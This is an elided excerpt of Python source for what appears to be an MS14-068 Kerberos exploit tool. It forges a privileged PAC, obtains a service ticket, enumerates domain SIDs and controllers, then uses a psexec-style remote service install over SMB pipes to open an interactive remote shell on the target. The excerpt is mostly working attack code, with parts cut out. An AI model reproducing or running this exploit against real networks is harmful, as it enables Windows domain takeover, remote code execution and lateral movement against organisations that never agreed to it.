...
class PSEXEC1:
        ...
        try:
            ...
            if self.__exeFile is None:
                installService = serviceinstall.ServiceInstall(
                    rpctransport.get_smb_connection(), remcomsvc.RemComSvc())
            else:
                try:
            ...
            if self.__copyFile is not None:
                installService.copy_file(
                    self.__copyFile, installService.getShare(), os.path.basename(self.__copyFile))
                # And we change the command to be executed to this filename
                self.__command = os.path.basename(
                    self.__copyFile) + ' ' + self.__command
    ...
    def openPipe(self, s, tid, pipe, accessMask):
        ...
        fid = s.openFile(tid, pipe, accessMask,
    ...
    def connectPipe(self):
        try:
            ...
            self.fid = self.server.openFile(
                self.tid, self.pipe, self.permissions, creationOption=0x40, fileAttributes=0x80)
            self.server.setTimeout(1000000)
        except:
            logging.critical(
                "Something wen't wrong connecting the pipes(%s), try again" % self.__class__)
...
class RemoteShell(cmd.Cmd):
    ...
    def connect_transferClient(self):
        ...
        self.transferClient.kerberosLogin(
            user, passwd, domain, lm, nt, aesKey, TGS=self.TGS, useCache=False)
...
class RemoteStdInPipe(Pipes):
    ...
    def run(self):
        self.connectPipe()
        shell = RemoteShell(self.server, self.port, self.credentials,
                            self.tid, self.fid, self.TGS, self.share)
        shell.cmdloop()
...
class MS14_068:
    ...
    def getGoldenPAC(self, authTime):
        ...
        buffersTail = str(serverChecksum) + serverChecksumAlignment + \
            str(privSvrChecksum) + privSvrChecksumAlignment
    ...
    def getKerberosTGS(self, serverName, domain, kdcHost, tgt, cipher, sessionKey, authTime):
        ...
        encryptedEncodedIfRelevant = cipher.encrypt(
            sessionKey, 4, encodedIfRelevant, None)
        ...
        newSessionKey = Key(cipher.enctype, str(
    ...
    def getForestSid(self):
        ...
        resp = hLsarQueryInformationPolicy2(
            dce, policyHandle, POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
        dce.disconnect()
    ...
    def getDomainControllers(self):
        ...
        stringBinding = epm.hept_map(
            self.__domain, MSRPC_UUID_DRSUAPI, protocol='ncacn_ip_tcp')
    ...
    def getUserSID(self):
        ...
        resp = samr.hSamrLookupDomainInSamServer(
            dce, serverHandle, self.__domain)
        ...
        resp = samr.hSamrLookupNamesInDomain(
            dce, domainHandle, (self.__username,))
    ...
    def exploit(self):
        ...
        try:
            ...
            logging.error(
                'Couldn\'t get forest info (%s), continuing' % str(e))
            self.__forestSid = None
        ...
        for dc in self.__domainControllers:
            ...
            while True:
                    ...
                    for pa in asRep['padata']:
                        if pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
                            etype2 = decoder.decode(
                                str(pa['padata-value'])[2:], asn1Spec=ETYPE_INFO2_ENTRY())[0]
                ...
                serverName = Principal(
                    'cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
                try:
        ...
        if exception is None:
            ...
            if self.__command != 'None':
                executer = PSEXEC1(self.__command, self.__username,
                                   self.__domain, s, TGS, self.__copyFile)
...
if __name__ == '__main__':
    ...
    try:
        ...
        logging.critical(
            'You can get it from https://pypi.python.org/pypi/pyasn1')
        sys.exit(1)
    import datetime
    from calendar import timegm
    from time import strptime
    ...
    parser.add_argument('target', action='store',
                        help='[[domain/]username[:password]@]<targetName>')
